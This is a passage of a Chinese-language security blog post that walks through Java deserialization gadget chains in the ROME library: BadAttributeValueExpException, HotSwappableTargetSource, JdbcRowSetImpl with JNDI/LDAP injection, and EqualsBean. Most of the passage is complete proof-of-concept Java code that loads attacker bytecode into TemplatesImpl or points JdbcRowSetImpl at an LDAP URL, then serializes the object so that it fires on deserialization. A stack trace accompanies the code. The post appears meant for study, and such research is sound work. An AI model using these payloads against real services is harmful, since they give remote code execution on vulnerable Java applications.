src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735227205386-b0c16d7c-699e-4fa6-ac11-abec86236342.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735227291022-30a771ff-dd42-4106-8d56-82fba20ed789.png" alt=""></p><p>这里可以看到是可以调用toString方法的但由于在其构造函数中也调用了<code>toString()</code>，为了避免提前触发漏洞，我们可以利用反射修改<code>val</code>的值为需要调用<code>toString()</code>方法的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Remo_BadAttributeValueExpException</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Rome_stu/src/main/java/Exp.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">111</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Serialize(badAttributeValueExpException);</span><br><span class="line">        DeSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">DeSerialize</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(s));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="HotSwappableTargetSource利用链">HotSwappableTargetSource利用链</h2><p>这里其实在Fastjson中有提到过利用他的Xstring能够触发toString方法具体执行流程可以参考写的笔记</p><p><a href="https://www.yuque.com/zqiangweihuakai/ybltae/kgggvgva58tf3sny">Fasjson 完整版</a>这里有记录HotSwappableTargetSource执行流程。了解完执行流程就可以很快明白以下poc</p><p>环境依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-aop&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">5.3</span><span class="number">.24</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Remo_HotSwappableTargetSource</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Rome_stu/src/main/java/Exp.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(toStringBean);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xxx&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(h1, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        hashMap.put(h2,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Serialize(hashMap);</span><br><span class="line">        DeSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">DeSerialize</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(s));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="JdbcRowSetImpl利用链">JdbcRowSetImpl利用链</h2><p>这里这条链跟前面的有点不太一样，他是去替换templatesImpl的是替换的后半段，我们来看看为什么，前面说到过rmoe可以触发任意类的getter方法，所以这里肯定是去找JdbcRowSetImpl这条链的get方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735229299376-5beac801-7708-49cc-8510-8d7c6f0d871e.png" alt=""></p><p>这里能够找到存在一个getDatabaseMetaData方法它里面调用了一个connect方法我们跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735229346935-b6020fff-7ef5-447f-b8e3-96981652baec.png" alt=""></p><p>可以看到这里很明显的jndi注入。</p><p>lookUp里的值是去调用他父类BaseRowSet的getDataSourceName方法获取的</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735229417281-89625249-3d4c-442f-ad8b-872c496111de.png" alt=""></p><p>所以可以构造POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// ldap url</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/nils4f&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建JdbcRowSetImpl对象</span></span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">dataSource</span> <span class="operator">=</span> BaseRowSet.class.getDeclaredField(<span class="string">&quot;dataSource&quot;</span>);</span><br><span class="line">        dataSource.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        dataSource.set(jdbcRowSet, url);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建ToStringBean对象</span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class, jdbcRowSet);</span><br><span class="line">        <span class="comment">// 创建ObjectBean</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建HashMap</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(objectBean, <span class="string">&quot;bbbb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;JdbcRowExp.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;JdbcRowExp.bin&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我在windows环境下复现成功了但是mac下没有不知道啥原因哈哈哈有懂得师傅教教</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735284805014-b6da1187-b55b-477c-a96d-87fcbff95147.png" alt=""></p><p>这里的入口点hashMap是可以更改的然后中间的ObejctBean还有EqualsBean都可以灵活搭配使用。</p><h2 id="EqualsBean链">EqualsBean链</h2><p>这条链的主要关键点在于EqualsBean类中存在一个方法是beanEquals方法来看一下这个方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735286386895-e0d90746-e2ef-4970-8e81-d7fe65e79e2d.png" alt=""></p><p>这里可以看到他和ToStringBean类的tostring方法很像也是可以任意调用getter方法的，所以其实这里关键点就是找到谁能够调用了这个beanEquals方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735286514936-79102317-a611-4a73-82e0-1204a4d5f969.png" alt=""></p><p>可以看到在他同类下的equals方法调用了该方法，前面在分析触发toString方法时提到过使用equals方法进行触发</p><p>所以下面就是寻找调用equals方法的地方。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735287426398-10c5ef84-1068-4228-aaf4-c16baa165db7.png" alt=""></p><p>在HashMap的父类AbstractMap类中的equals方法中调用了equals方法</p><p>所以可以构造出来payload，师傅可以自己根据poc的调用栈去分析能更好懂一点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:<span class="number">507</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">beanEquals:<span class="number">146</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">equals:<span class="number">103</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">equals:<span class="number">472</span>, AbstractMap (java.util)</span><br><span class="line">putVal:<span class="number">634</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">334</span>, HashSet (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">DeSerialize:<span class="number">54</span>, Remo_EqualsBean (com.ocean)</span><br><span class="line">main:<span class="number">45</span>, Remo_EqualsBean (com.ocean)</span><br></pre></td></tr></table></figure><p>直接给出poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Remo_EqualsBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Rome_stu/src/main/java/Exp.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class, <span class="string">&quot;s&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>, bean);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>, templatesimpl);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>, bean);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>, templatesimpl);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        table.add(map1);</span><br><span class="line">        table.add(map2);</span><br><span class="line"></span><br><span class="line">        setValue(bean, <span class="string">&quot;_beanClass&quot;</span>, Templates.class);</span><br><span class="line">        setValue(bean, <span class="string">&quot;_obj&quot;</span>, templatesimpl);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Serialize(table);</span><br><span class="line">        DeSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">DeSerialize</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(s));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735288986252-7703d93d-bd42-4ec3-bf1e-48abadd4b26c.png" alt=""></p><p>其实这里具体为什么要put两次map呢我个人的看法，就是在putVal这个方法里为了满足这个判断条件就是要key的hash值相等。</p><p><strong>注</strong>：这里的HashMap、HashSet、HashTable都可以相互替换参考：<a href="https://goodapple.top/archives/1145">https://goodapple.top/archives/1145</a></p><p><a 